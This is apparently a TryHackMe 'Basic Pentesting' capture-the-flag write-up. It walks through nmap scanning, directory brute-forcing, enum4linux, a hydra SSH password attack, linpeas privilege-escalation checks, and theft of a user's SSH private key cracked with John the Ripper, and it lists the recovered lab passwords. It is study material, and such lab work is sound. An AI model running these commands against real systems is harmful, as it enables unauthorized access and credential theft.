# Flow

<img src="../../assets/TryHackMe/BasicPentesting/flow.drawio.svg" height="500" />

# NMap

Use nmap to scan open ports of the target host.
## Command

```` console
sudo nmap -vvv -p- -sS -A -T4 -oN ~/Boxes/HTB/Basic\ Pentesting/nmap.log 10.10.183.193`

### Flags
-vvv: verbosity level 3\
-p-: all ports\
-sS: stealth scan (stealthy sync packet based scan)\
-A: Enable OS detection, version detection, script scanning, and traceroute
-T4: Set timing template (higher is faster) {0-5}\
-oN: output: normal
````

## Findings (Open Ports)

| Port | Service       | Details       | Note                                     |

# DirBuster (GUI)
Use DirBuster to find hidden directories and files.

## Flags / Options

````console
Work Method: Use GET requests only (is faster)
Use word list 
````

## Findings

Found dirs:

- /development (with dev logs)
  - /dev.txt: Mentioned struts 2.5.12 (with remote code exe vulnerability)
  - /j.txt: Mentioned weak credentials

# enum4linux

Try to find users with enum4linux.

## Command

```` console

enum4linux -a {IP-Address} | tee enum4linux.log

````

## Findings

- Found 2 users: kay & jan

# hydra (password guesser (bruteforce))

Use hydra and rockyou wordlist to  get jan's password.

```` console

hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://{IP-Address} 


## Flags
-l: Username\
-P: wordlist\
(-t: number of parallel tasks) 
````

## Findings

Found user: 

- login: jan 
- password: armando 

# SMB 
Anonymous access is open, no password required. Lets sniff around a bit.

## Command

```` console

smbclient //{IP-Address}/anonymous

`?` : list available commands
`l` : list 
`get staff.txt {target path}` : transfer file to local host
````

## Findings
- Found "staff.txt" file - says not to upload non-work-related items

# linpeas
Use linpeas injected via ssh with jan's account gained password to find privilege escalation paths.

## Commands
```` console
Use scp to transfer linpeas.sh to target 
scp /usr/share/peass/linpeas/linpeas.sh jan@{IP-Address}:{target path}
and then ssh into target execute the script with
./linpeas.sh | teee linlog.txt
````

## Findings
Found readable: /home/kay/.ssh/id_rsa

# SSH 
Use Jan's ssh credentials to sniff around.

```` console

`cat /home/kay/.ssh/id_rsa` and copy it 
on local host `nano kay_id_rsa` paste and save the file
````

## Findings

# John the Ripper

Use John the Ripper to find Kays password from is private key.
## Commands

Run `ssh2john kay_id_rsa > john4kay.txt` to decrypt the private key to a text file readable by John
Run `john john4kay.txt --wordlist=/usr/share/wordlists/rockyou.txt` to reveal the ssh password ("beeswax")
use the ssh password and the id_rsa file to login via ssh as kay `ssh -i kay_id_rsa kay@{IP-Address}` 
`ls` in kay's home dir shows a `pass.back` file 
`cat pass.bak` reveals his password ("heresareallystrongpasswordthatfollowsthepasswordpolicy$$")

## Findings

kay's password
